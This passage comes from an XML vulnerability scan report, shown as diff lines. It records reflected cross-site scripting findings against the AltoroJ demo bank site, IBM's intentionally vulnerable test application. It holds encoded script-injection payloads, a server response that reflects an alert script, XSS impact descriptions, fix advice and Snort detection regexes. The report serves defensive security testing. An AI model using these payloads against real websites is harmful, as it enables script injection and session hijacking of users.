+about manually testing your application for Cross-Site Scripting.</SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText>&lt;br /&gt;&lt;br /&gt;&lt;b&gt;OWASP Cross-Site Scripting Information&lt;/b&gt;&lt;br /&gt;&lt;a href="https://www.owasp.org/index.php/XSS"&gt;https://www.owasp.org/index.php/XSS&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;&lt;b&gt;CERT&lt;/b&gt;&lt;br /&gt;&lt;a href="http://www.cert.org/advisories/CA-2000-02.html"&gt;http://www.cert.org/advisories/CA-2000-02.html&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;&lt;b&gt;Apache&lt;/b&gt;&lt;br /&gt;&lt;a href="http://httpd.apache.org/info/css-security/apache_specific.html"&gt;http://httpd.apache.org/info/css-security/apache_specific.html&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;&lt;b&gt;CGISecurity&lt;/b&gt;&lt;br /&gt;&lt;a href="https://www.cgisecurity.com/xss-faq.html "&gt;https://www.cgisecurity.com/xss-faq.html&lt;/a&gt;</SectionText></ReportSection><RawResponse>HTTP/1.1 200
+Content-Type: text/html;charset=ISO-8859-1
+Content-Length: 7405
+Date: Fri, 27 Dec 2024 06:26:44 GMT
+Keep-Alive: timeout=20
+Connection: keep-alive
+
+
+
+
+
+ 
+
+    
+    
+
+
+
+ 
+
+&lt;!-- BEGIN HEADER --&gt;
+&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
+
+&lt;html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" &gt;
+
+
+
+&lt;head&gt;
+	&lt;title&gt;Altoro Mutual&lt;/title&gt;
+  &lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" /&gt;
+  &lt;link href="/altoromutual/style.css" rel="stylesheet" type="text/css" /&gt;
+&lt;/head&gt;
+&lt;body style="margin-top:5px;"&gt;
+
+&lt;div id="header" style="margin-bottom:5px; width: 99%;"&gt;
+  &lt;form id="frmSearch" method="get" action="/altoromutual/search.jsp"&gt;
+	  &lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;
+		  &lt;tr&gt;
+		      &lt;td rowspan="2"&gt;&lt;a id="HyperLink1" href="/altoromutual/index.jsp"&gt;&lt;img src="/altoromutual/images/logo.gif" width=283 height=80/&gt;&lt;/a&gt;&lt;/td&gt;
+			  &lt;td align="right" valign="top"&gt;
+  			  &lt;a id="LoginLink" href="/altoromutual/login.jsp"&gt;&lt;font style="font-weight: bold; color: red;"&gt;Sign In&lt;/font&gt;&lt;/a&gt; | &lt;a id="HyperLink3" href="/altoromutual/index.jsp?content=inside_contact.htm"&gt;Contact Us&lt;/a&gt; | &lt;a id="HyperLink4" href="/altoromutual/feedback.jsp"&gt;Feedback&lt;/a&gt; | &lt;label for="txtSearch"&gt;Search&lt;/label&gt;
+          &lt;input type="text" name="query" id="query" accesskey="S" /&gt;
+          &lt;input type="submit" value="Go" /&gt;
+			  &lt;/td&gt;
+		  &lt;/tr&gt;
+		  &lt;tr&gt;
+			  &lt;td align="right" style="background-image:url('/altoromutual/images/gradient.jpg');padding:0px;margin:0px;"&gt;&lt;img src="/altoromutual/images/header_pic.jpg" alt="" width=354 height=60/&gt;&lt;/td&gt;
+		  &lt;/tr&gt;
+	  &lt;/table&gt;
+	&lt;/form&gt;
+&lt;/div&gt;
+
+&lt;table cellspacing="0" width="100%"&gt;
+  &lt;tr&gt;
+    &lt;td width="25%" class="bt br bb"&gt;&lt;div id="Header1"&gt;&lt;img id="Image1" src="/altoromutual/images/pf_lock.gif" width=12 height=14 style="vertical-align: bottom;" alt="Secure Login"/&gt; &amp;nbsp; &lt;a id="AccountLink" href="/altoromutual/login.jsp" class="focus" &gt;ONLINE BANKING LOGIN&lt;/a&gt;&lt;/div&gt;&lt;/td&gt;
+    &lt;td width="25%" class="cc bt br bb"&gt;&lt;div id="Header2"&gt;&lt;a id="LinkHeader2" class="focus" href="/altoromutual/index.jsp?content=personal.htm" &gt;PERSONAL&lt;/a&gt;&lt;/div&gt;&lt;/td&gt;
+    &lt;td width="25%" class="cc bt br bb"&gt;&lt;div id="Header3"&gt;&lt;a id="LinkHeader3" class="focus" href="/altoromutual/index.jsp?content=business.htm" &gt;SMALL BUSINESS&lt;/a&gt;&lt;/div&gt;&lt;/td&gt;
+    &lt;td width="25%" class="cc bt bb"&gt;&lt;div id="Header4"&gt;&lt;a id="LinkHeader4" class="focus" href="/altoromutual/index.jsp?content=inside.htm"&gt;INSIDE ALTORO MUTUAL&lt;/a&gt;&lt;/div&gt;&lt;/td&gt;
+  &lt;/tr&gt;
+  &lt;tr&gt;
+  
+  &lt;!-- END HEADER --&gt;
+
+
+&lt;div id="wrapper" style="width: 99%;"&gt;
+	 
+
+&lt;!-- TOC BEGIN --&gt;     
+     &lt;td valign="top" class="cc br bb"&gt;
+        &lt;br style="line-height: 10px;"/&gt;
+        
+        &lt;a id="CatLink1" class="subheader" href="index.jsp?content=personal.htm"&gt;PERSONAL&lt;/a&gt;
+        &lt;ul class="sidebar"&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink1" href="index.jsp?content=personal_deposit.htm"&gt;Deposit Product&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink2" href="index.jsp?content=personal_checking.htm"&gt;Checking&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink3" href="index.jsp?content=personal_loans.htm"&gt;Loan Products&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink4" href="index.jsp?content=personal_cards.htm"&gt;Cards&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink5" href="index.jsp?content=personal_investments.htm"&gt;Investments &amp;amp; Insurance&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink6" href="index.jsp?content=personal_other.htm"&gt;Other Services&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+
+        &lt;a id="CatLink2" class="subheader" href="index.jsp?content=business.htm"&gt;SMALL BUSINESS&lt;/a&gt;
+        &lt;ul class="sidebar"&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink7" href="index.jsp?content=business_deposit.htm"&gt;Deposit Products&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink8" href="index.jsp?content=business_lending.htm"&gt;Lending Services&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink9" href="index.jsp?content=business_cards.htm"&gt;Cards&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink10" href="index.jsp?content=business_insurance.htm"&gt;Insurance&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink11" href="index.jsp?content=business_retirement.htm"&gt;Retirement&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink12" href="index.jsp?content=business_other.htm"&gt;Other Services&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+
+        &lt;a id="CatLink3" class="subheader" href="index.jsp?content=inside.htm"&gt;INSIDE ALTORO MUTUAL&lt;/a&gt;
+        &lt;ul class="sidebar"&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink13" href="index.jsp?content=inside_about.htm"&gt;About Us&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink14" href="index.jsp?content=inside_contact.htm"&gt;Contact Us&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink15" href="cgi.exe"&gt;Locations&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink16" href="index.jsp?content=inside_investor.htm"&gt;Investor Relations&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink17" href="index.jsp?content=inside_press.htm"&gt;Press Room&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink18" href="index.jsp?content=inside_careers.htm"&gt;Careers&lt;/a&gt;&lt;/li&gt;
+			&lt;li&gt;&lt;a id="MenuHyperLink19" href="subscribe.jsp"&gt;Subscribe&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+    &lt;/td&gt;
+&lt;!-- TOC END --&gt;
+
+    &lt;td valign="top" colspan="3" class="bb"&gt;
+    
+    
+		
+		&lt;div class="fl" style="width: 99%;"&gt;
+		
+		 &lt;h1&gt;Thank You&lt;/h1&gt;
+		 
+		 &lt;p&gt;Thank you for your comments, Jason&lt;sCrIpT&gt;alert(63775)&lt;/sCrIpT&gt;.  They will be reviewed by our Customer Service staff and given the full attention that they deserve. 
+		  
+			 Our reply will be sent to your email: john.doe@somewhere.com
+		
+		&lt;/p&gt;
+		
+		&lt;/div&gt;
+    &lt;/td&gt;	
+&lt;/div&gt;
+
+ 
+
+&lt;!-- BEGIN FOOTER --&gt;
+
+
+&lt;/tr&gt;
+&lt;/table&gt;
+&lt;div id="footer" style="width: 99%;"&gt;
+    &lt;a id="HyperLink5" href="/altoromutual/index.jsp?content=privacy.htm"&gt;Privacy Policy&lt;/a&gt;
+    &amp;nbsp;&amp;nbsp;|&amp;nbsp;&amp;nbsp;
+    &lt;a id="HyperLink6" href="/altoromutual/index.jsp?content=security.htm"&gt;Security Statement&lt;/a&gt;
+    &amp;nbsp;&amp;nbsp;|&amp;nbsp;&amp;nbsp;
+    &lt;a id="HyperLink6" href="/altoromutual/status_check.jsp"&gt;Server Status Check&lt;/a&gt;
+    &amp;nbsp;&amp;nbsp;|&amp;nbsp;&amp;nbsp; 
+    &lt;a id="HyperLink6" href="/altoromutual/swagger/index.html"&gt;REST API&lt;/a&gt;
+    &amp;nbsp;&amp;nbsp;|&amp;nbsp;&amp;nbsp; 
+    &amp;copy;&amp;nbsp;2024 Altoro Mutual, Inc.
+    &lt;span style="color:red;font-weight:bold;font-style:italic;float:right"&gt;This web application is open source!&lt;span style="color:black;font-style:italic;font-weight:normal;float:right"&gt;&amp;nbsp;&lt;a href="https://github.com/AppSecDev/AltoroJ/"&gt;Get your copy from GitHub&lt;/a&gt; and take advantage of advanced features&lt;/span&gt;&lt;/span&gt;
+	&lt;br&gt;&lt;br&gt;&lt;br&gt;
+    &lt;div class="disclaimer"&gt;
+        The AltoroJ website is published by IBM Corporation for the sole purpose of
+        demonstrating the effectiveness of IBM products in detecting web application
+        vulnerabilities and website defects. This site is not a real banking site. Similarities,
+        if any, to third party products and/or websites are purely coincidental. This site is
+        provided "as is" without warranty of any kind, either express or implied. IBM does
+        not assume any risk in relation to your use of this website. For more information,
+        please go to &lt;a id="HyperLink7" href="http://www-142.ibm.com/software/products/us/en/subcategory/SWI10" &gt;http://www-142.ibm.com/software/products/us/en/subcategory/SWI10&lt;/a&gt;.&lt;br /&gt;&lt;br /&gt;
+
+        Copyright &amp;copy; 2008, 2024, IBM Corporation, All rights reserved.
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+&lt;!-- END FOOTER --&gt;</RawResponse></Issue><Issue><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5105</EngineType><URL>http://ec2-18-228-23-75.sa-east-1.compute.amazonaws.com:7272/altoromutual/sendFeedback</URL><Scheme>http</Scheme><Host>ec2-18-228-23-75.sa-east-1.compute.amazonaws.com</Host><Port>7272</Port><AttackMethod>POST</AttackMethod><AttackParam>email_addr</AttackParam><VulnerableSession>POST /altoromutual/sendFeedback HTTP/1.1
+Referer: http://ec2-18-228-23-75.sa-east-1.compute.amazonaws.com:7272/altoromutual/feedback.jsp
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 186
+Accept: */*
+Pragma: no-cache
+Accept-Encoding: gzip, deflate
+Host: ec2-18-228-23-75.sa-east-1.compute.amazonaws.com:7272
+User-Agent: Mozilla/5.0 (Windows NT 6.5; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
+Connection: Keep-Alive
+X-WIPP: AscVersion=23.2.0.65
+X-Scan-Memo: Category="Audit.Attack";SID="F8A20BA113E7A88903C6C74E5525F163";PSID="9A88F60DE274A9929EB3CDBB67F81EAE";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="4";AttackParamDesc="email_addr";AttackParamIndex="2";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="John.Doe%2540somewhere.com%253c%2573%2563%2572%2569%2570%2574%2520%2573%2572%2563%253d%252f%252f%2534%2532%2532%2536%2537%2520%2569%2564%253d%2522";AttackStringProps="Attack";tht="40";
+X-RequestManager-Memo: stid="41";stmi="0";sc="1";rid="0e96b71d";
+X-Request-Memo: rid="30a8746e";sc="1";thid="44";
+Cookie: CustomCookie=WebInspect205969ZX91D8062297F94A3DAE8562420D869CBCY10EF;JSESSIONID=5A2AD4A37BE2FEC0D3888A16DF42F85E
+
+cfile=comments.txt&amp;name=Jason&amp;email_addr=John.Doe%40somewhere.com%3c%73%63%72%69%70%74%20%73%72%63%3d%2f%2f%34%32%32%36%37%20%69%64%3d%22&amp;subject=12345&amp;comments=12345&amp;submit=%20Submit%20</VulnerableSession><TriggerSession>POST /altoromutual/sendFeedback HTTP/1.1
+Referer: http://ec2-18-228-23-75.sa-east-1.compute.amazonaws.com:7272/altoromutual/feedback.jsp
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 114
+Accept: */*
+Pragma: no-cache
+Accept-Encoding: gzip, deflate
+Host: ec2-18-228-23-75.sa-east-1.compute.amazonaws.com:7272
+Connection: Keep-Alive
+X-WIPP: AscVersion=23.2.0.65
+X-Scan-Memo: Category="Crawl";SID="9A88F60DE274A9929EB3CDBB67F81EAE";PSID="350B49237BA3A48B5CF853D2AF0E984E";SessionType="Crawl";CrawlType="Form";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="action";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tht="31";
+X-RequestManager-Memo: stid="25";stmi="0";sc="1";rid="ad995e85";
+X-Request-Memo: rid="4397e790";sc="1";thid="37";
+Cookie: CustomCookie=WebInspect205969ZX91D8062297F94A3DAE8562420D869CBCY10EF;JSESSIONID=9BF47E8C04470A9ACF572A897CDA1350
+
+cfile=comments.txt&amp;name=Jason&amp;email_addr=John.Doe%40somewhere.com&amp;subject=12345&amp;comments=12345&amp;submit=%20Submit%20</TriggerSession><VulnerabilityID>5649</VulnerabilityID><Severity>4</Severity><Name>Cross-Site Scripting: Reflected</Name><ReportSection><Name>Summary</Name><SectionText>&lt;hp-img src="xss.rgc" /&gt;&lt;br /&gt;Cross-Site Scripting vulnerability found in Post parameter email_addr.  The following attack uses plain encoding:&lt;br&gt;&lt;br&gt;&amp;lt;script src=//42267 id=&amp;quot;&lt;br&gt;&lt;br/&gt;&lt;br/&gt;A Cross-Site Scripting (XSS) vulnerability was detected in the web application. Cross-Site Scripting occurs when dynamically generated web pages display user input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. In this instance, the web application was vulnerable to an automatic payload, meaning the user simply has to visit a page to make the malicious scripts execute. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on end user systems. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.</SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText>&lt;br /&gt;
+Cross-Site Scripting(XSS) happens when user input from a web client is immediately included via server-side scripts in a dynamically generated web page. Reflected XSS is specifically considered critical when malicious payload can be embedded in a URL (e.g. in query strings of GET requests). An attacker can trick a victim, via phishing attack, to click on a link with vulnerable input which has been altered to include attack code and then sent to the legitimate server. The injected code is then reflected back to the user's browser which executes it. &lt;br /&gt;&lt;br /&gt;
+
+The implications of successful Cross-Site Scripting attacks are:
+
+&lt;ul&gt;&lt;li&gt;Account hijacking -  An attacker can hijack the user's session before the session cookie expires and take actions with the privileges of the user who accessed the URL, such as issuing database queries and viewing the results. &lt;/li&gt;&lt;li&gt;Malicious script execution - Users can unknowingly execute JavaScript, VBScript, ActiveX, HTML, or even Flash content that has been inserted into a dynamically generated page by an attacker. 
+
+&lt;/li&gt;&lt;li&gt;Worm propagation - With Ajax applications, XSS can propagate somewhat like a virus. The XSS payload can autonomously inject itself into pages, and easily re-inject the same host with more XSS, all of which can be done with no hard refresh. Thus, XSS can send multiple requests using complex HTTP methods to propagate itself invisibly to the user.
+&lt;/li&gt;&lt;li&gt;Information theft - Via redirection and fake sites, attackers can connect users to a malicious server of the attacker's choice and capture any information entered by the user.&lt;/li&gt;&lt;li&gt;	Denial of Service - Often by utilizing malformed display requests on sites that contain a Cross-Site Scripting vulnerability, attackers can cause a denial of service condition to occur by causing the host site to query itself repeatedly . &lt;/li&gt;&lt;li&gt;Browser Redirection - On certain types of sites that use frames, a user can be made to think that he is in fact on the original site when he has been redirected to a malicious one, since the URL in the browser's address bar will remains the same. This is because the entire page isn't being redirected, just the frame in which the JavaScript is being executed is redirected. &lt;/li&gt;&lt;li&gt;	Manipulation of user settings - Attackers can change user settings for nefarious purposes. &lt;/li&gt;&lt;li&gt;Bypass Content-Security-Policy protection  -  Attackers can inject a malformed tag formation, known as dangling tag injection, which in some cases allows injected script to reuse valid nonce on the page and bypass script source restriction. Additionally dangling tag injection can be used to steal sensitive information embedded in HTML response if browser is able to make a request to the injected link. &lt;/li&gt;&lt;li&gt;Base tag injection: Attacker can cause relative links on a page to load from a different domain by modifying the base URL for the page via base tag injection.&lt;/li&gt;&lt;li&gt;Link prefetch injection: While unable to execute script, attackers can use link tag with rel=prefetch that will make browsers pre-fetch the specified link even though it is never rendered and rejected subsequently due to web application enforced cross-site policy (e.g. CSP protections).&lt;/li&gt;&lt;li&gt;Edge side includes (ESI) Injection - ESI  is a markup language used in various HTTP devices, such as reverse proxies and load balancers, that are positioned between client and server.  An attacker can inject ESI markup to perform critical attacks such as cross-site scripting and HTTPOnly cookie protection bypass. &lt;/li&gt;&lt;/ul&gt;</SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText>&lt;br /&gt;
+
+View the attack string included with the request to check what to search for in the response. For instance, if "(javascript:alert('XSS')"  is submitted as an attack (or another scripting language), it will also appear as part of the response.  This indicates that the web application is taking values from the HTTP request parameters and using them in the HTTP response without first removing potentially malicious data.
+
+
+The response can be viewed in “Web Browser” view in the Vulnerability pane to see the injected popup events in action. Events requiring user interaction (e.g. onmouseover or onclick events) can be triggered by performing the corresponding action (e.g. clicking the injected link). 
+
+
+
+Injection with numeric string in src, or href, attributes indicates that the site is vulnerable to script include or content exfiltration. These can be verified by repeating the request in a browser and intercepting originating network traffic in a web proxy.</SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText>&lt;br /&gt;&lt;b&gt;For Development:&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;
+Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. When validating user input, 
+
+verify that it matches the strictest definition of valid input possible. For example, if a certain parameter is supposed to be a number, attempt 
+
+to convert it to a numeric data type in your programming language. &lt;br /&gt;&lt;br /&gt;&lt;b&gt;PHP:&lt;/b&gt; intval("0".$_GET['q']);   &lt;br /&gt;&lt;br /&gt;&lt;b&gt;ASP.NET:&lt;/b&gt; 
+
+int.TryParse(Request.QueryString["q"], out val); &lt;br /&gt;&lt;br /&gt;
+
+The same applies to date and time values, or anything that can be converted to a stricter type before being used. When accepting other types of 
+
+text input, make sure the value matches either a list of acceptable values (white-listing), or a strict regular expression. If at any point the 
+
+value appears invalid, do not accept it. Also, do not attempt to return the value to the user in an error message. &lt;br /&gt;&lt;br /&gt;
+
+Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. 
+
+These should be used to sanitize all input before it is displayed to the client. &lt;br /&gt;&lt;br /&gt;&lt;b&gt;PHP:&lt;/b&gt;  string htmlspecialchars (string string 
+
+[, int quote_style])&lt;br /&gt;&lt;br /&gt;&lt;b&gt;ASP.NET:&lt;/b&gt; Server.HTMLEncode (strHTML String)
+
+
+
+&lt;br /&gt;&lt;br /&gt;
+
+When reflecting values into JavaScript or another format, make sure to use a type of encoding that is appropriate. Encoding data for HTML is not 
+
+sufficient when it is reflected inside of a script or style sheet. For example, when reflecting data in a JavaScript string, make sure to encode 
+
+all non-alphanumeric characters using hex (\xHH) encoding.&lt;br /&gt;&lt;br /&gt;
+
+If you have JavaScript on your page that accesses unsafe information (like location.href) and writes it to the page (either with document.write, 
+
+or by modifying a DOM element), make sure you encode data for HTML before writing it to the page. JavaScript does not have a built-in function to 
+
+do this, but many frameworks do. If you are lacking an available function, something like the following will handle most cases:&lt;br /&gt;&lt;br /&gt;
+
+s = s.replace(/&amp;amp;/g,'&amp;amp;amp;').replace(/"/i,'&amp;amp;quot;').replace(/&amp;lt;/i,'&amp;amp;lt;').replace(/&amp;gt;/i,'&amp;amp;gt;').replace(/'/i,'&amp;amp;apos;')
+
+
+&lt;br /&gt;&lt;br /&gt;
+
+Ensure that you are always using the right approach at the right time. Validating user input should be done as soon as it is received. Encoding 
+
+data for display should be done immediately before displaying it.
+
+&lt;b&gt;&lt;br /&gt;&lt;br /&gt;
+
+
+For Security Operations:&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;
+
+Server-side encoding, where all dynamic content is first sent through an encoding function where Scripting tags will be replaced with codes in the 
+
+selected character set, can help to prevent Cross-Site Scripting attacks. &lt;br /&gt;&lt;br /&gt;
+
+Many web application platforms and frameworks have some built-in support for preventing Cross-Site Scripting. Make sure that any built-in 
+
+protection is enabled for your platform. In some cases, a misconfiguration could allow Cross-Site Scripting. In ASP.NET, if a page's 
+
+EnableViewStateMac property is set to False, the ASP.NET view state can be used as a vector for Cross-Site Scripting. &lt;br /&gt;&lt;br /&gt;
+
+An IDS or IPS can also be used to detect or filter out XSS attacks. Below are a few regular expressions that will help detect Cross-Site 
+
+Scripting. &lt;br /&gt;&lt;br /&gt;&lt;b&gt;Regex for a simple XSS attack:&lt;/b&gt;&lt;br /&gt;
+/((\%3C)|&amp;lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&amp;gt;)/ix &lt;br /&gt;&lt;br /&gt;
+
+The above regular expression would be added into a new Snort rule as follows: &lt;br /&gt;&lt;br /&gt;
+
+alert tcp $EXTERNAL_NET any -&amp;gt; $HTTP_SERVERS $HTTP_PORTS (msg:"NII Cross-Site Scripting attempt"; flow:to_server,established; 
+
+pcre:"/((\%3C)|&amp;lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&amp;gt;)/i"; classtype:Web-application-attack; sid:9000; rev:5;) &lt;br /&gt;&lt;br /&gt;&lt;b&gt;Paranoid regex for 
+
+XSS attacks:&lt;/b&gt;&lt;br /&gt;
+/((\%3C)|&amp;lt;)[^\n]+((\%3E)|&amp;gt;)/I &lt;br /&gt;&lt;br /&gt;
+
+This signature simply looks for the opening HTML tag, and its hex equivalent, followed by one or more characters other than the new line, and then 
+
+followed by the closing tag or its hex equivalent. This may end up giving a few false positives depending upon how your web application and web 
+
+server are structured, but it is guaranteed to catch anything that even remotely resembles a Cross-Site Scripting attack.
+
+&lt;br /&gt;&lt;br /&gt;&lt;b&gt;For QA:&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;
+
+
+Fixes for Cross-Site Scripting defects will ultimately require code based fixes. Read the the following links for more information 
+
+about manually testing your application for Cross-Site Scripting.</SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText>&lt;br /&gt;&lt;br /&gt;&lt;b&gt;OWASP Cross-Site Scripting Information&lt;/b&gt;&lt;br /&gt;&lt;a href="https://www.owasp.org/index.php/XSS"&gt;https://www.owasp.org/index.php/XSS&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;&lt;b&gt;CERT&lt;/b&gt;&lt;br /&gt;&lt;a href="http://www.cert.org/advisories/CA-2000-02.html"&gt;http://www.cert.org/advisories/CA-2000-02.html&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;&lt;b&gt;Apache&lt;/b&gt;&lt;br /&gt;&lt;a href="http://httpd.apache.org/info/css-security/apache_specific.html"&gt;http://httpd.apache.org/info/css-security/apache_specific.html&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;&lt;b&gt;CGISecurity&lt;/b&gt;&lt;br /&gt;&lt;a href="https://www.cgisecurity.com/xss-faq.html "&gt;https://www.cgisecurity.com/xss-faq.html&lt;/a&gt;</SectionText></ReportSection><RawResponse>HTTP/1.1 200
+Content-Type: text/html;charset=ISO-8859-1
+Content-Length: 7400
+Date: Fri, 27 Dec 2024 06:26:45 GMT
+Keep-Alive: timeout=20
+Connection: keep-alive
+
+
+
+
+
+ 
+
+    
+    
+
+
+
+ 
+
+&lt;!-- BEGIN HEADER --&gt;
+&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
+
+&lt;html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" &gt;
+
+
+
+&lt;head&gt;
+	&lt;title&gt;Altoro Mutual&lt;/title&gt;
+  &lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" /&gt;
+  &lt;link href="/altoromutual/style.css" rel="stylesheet" type="text/css" /&gt;
+&lt;/head&gt;
+&lt;body style="margin-top:5px;"&gt;
+
+&lt;div id="header" style="margin-bottom:5px; width: 99%;"&gt;
+  &lt;form id="frmSearch" method="get" action="/altoromutual/search.jsp"&gt;
+	  &lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;
+		  &lt;tr&gt;
+		      &lt;td rowspan="2"&gt;&lt;a id="HyperLink1" href="/altoromutual/index.jsp"&gt;&lt;img src="/altoromutual/images/logo.gif" width=283 height=80/&gt;&lt;/a&gt;&lt;/td&gt;
+			  &lt;td align="right" valign="top"&gt;
+  			  &lt;a id="LoginLink" href="/altoromutual/login.jsp"&gt;&lt;font style="font-weight: bold; color: red;"&gt;Sign In&lt;/font&gt;&lt;/a&gt; | &lt;a id="HyperLink3" href="/altoromutual/index.jsp?content=inside_contact.htm"&gt;Contact Us&lt;/a&gt; | &lt;a id="HyperLink4" href="/altoromutual/feedback.jsp"&gt;Feedback&lt;/a&gt; | &lt;label for="txtSearch"&gt;Search&lt;/label&gt;
+          &lt;input type="text" name="query" id="query" accesskey="S" /&gt;
+          &lt;input type="submit" value="Go" /&gt;
+			  &lt;/td&gt;
+		  &lt;/tr&gt;
+		  &lt;tr&gt;
+			  &lt;td align="right" style="background-image:url('/altoromutual/images/gradient.jpg');padding:0px;margin:0px;"&gt;&lt;img src="/altoromutual/images/header_pic.jpg" alt="" width=354 height=60/&gt;&lt;/td&gt;
+		  &lt;/tr&gt;
+	  &lt;/table&gt;
+	&lt;/form&gt;
+&lt;/div&gt;
+
+&lt;table cellspacing="0" width="100%"&gt;
+  &lt;tr&gt;
+    &lt;td width="25%" class="bt br bb"&gt;&lt;div id="Header1"&gt;&lt;img id="Image1" src="/altoromutual/images/pf_lock.gif" width=12 height=14 style="vertical-align: bottom;" alt="Secure Login"/&gt; &amp;nbsp; &lt;a id="AccountLink" href="/altoromutual/login.jsp" class="focus" &gt;ONLINE BANKING LOGIN&lt;/a&gt;&lt;/div&gt;&lt;/td&gt;
+    &lt;td width="25%" class="cc bt br bb"&gt;&lt;div id="Header2"&gt;&lt;a id="LinkHeader2" class="focus" href="/altoromutual/index.jsp?content=personal.htm" &gt;PERSONAL&lt;/a&gt;&lt;/div&gt;&lt;/td&gt;
+    &lt;td width="25%" class="cc bt br bb"&gt;&lt;div id="Header3"&gt;&lt;a id="LinkHeader3" class="focus" href="/altoromutual/index.jsp?content=business.htm" &gt;SMALL BUSINESS&lt;/a&gt;&lt;/div&gt;&lt;/td&gt;
+    &lt;td width="25%" class="cc bt bb"&gt;&lt;div id="Header4"&gt;&lt;a id="LinkHeader4" class="focus" href="/altoromutual/index.jsp?content=inside.htm"&gt;INSIDE ALTORO MUTUAL&lt;/a&gt;&lt;/div&gt;&lt;/td&gt;
+  &lt;/tr&gt;
+  &lt;tr&gt;
+  
+  &lt;!-- END HEADER --&gt;
+
+
+&lt;div id="wrapper" style="width: 99%;"&gt;
+	 
+
+&lt;!-- TOC BEGIN --&gt;     
+     &lt;td valign="top" class="cc br bb"&gt;
+        &lt;br style="line-height: 10px;"/&gt;
+        
+        &lt;a id="CatLink1" class="subheader" href="index.jsp?content=personal.htm"&gt;PERSONAL&lt;/a&gt;
+        &lt;ul class="sidebar"&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink1" href="index.jsp?content=personal_deposit.htm"&gt;Deposit Product&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink2" href="index.jsp?content=personal_checking.htm"&gt;Checking&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink3" href="index.jsp?content=personal_loans.htm"&gt;Loan Products&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink4" href="index.jsp?content=personal_cards.htm"&gt;Cards&lt;/a&gt;&lt;/li&gt;
